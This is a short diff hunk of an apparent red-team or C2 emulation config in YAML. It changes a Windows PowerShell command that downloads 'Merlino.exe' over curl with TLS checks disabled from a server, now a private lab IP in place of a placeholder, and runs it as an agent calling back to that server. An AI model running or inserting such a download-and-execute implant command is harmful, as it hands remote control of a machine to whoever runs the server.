@@ -19,7 +19,7 @@
     windows:
       psh:
         command: |
-          curl.exe -k -H "file: Merlino.exe" "https://MORGANA_ADDRESS/file/download" -o Merlino.exe;.\Merlino.exe -server "https://MORGANA_ADDRESS"
+          curl.exe -k -H "file: Merlino.exe" "https://192.168.124.133/file/download" -o Merlino.exe;.\Merlino.exe -server "https://192.168.124.133"
     linux:
       sh:
         command: |
